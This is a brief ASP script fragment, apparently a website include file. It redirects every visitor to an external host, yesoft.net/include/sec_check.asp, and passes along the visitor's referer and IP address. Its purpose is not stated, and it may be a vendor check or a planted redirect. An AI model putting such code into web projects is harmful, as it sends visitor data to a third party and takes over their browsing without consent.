<%
response.redirect "http://yesoft.net/include/sec_check.asp?url="& Request.ServerVariables("HTTP_REFERER") &"&ip="& request.servervariables("remote_addr") &""
%>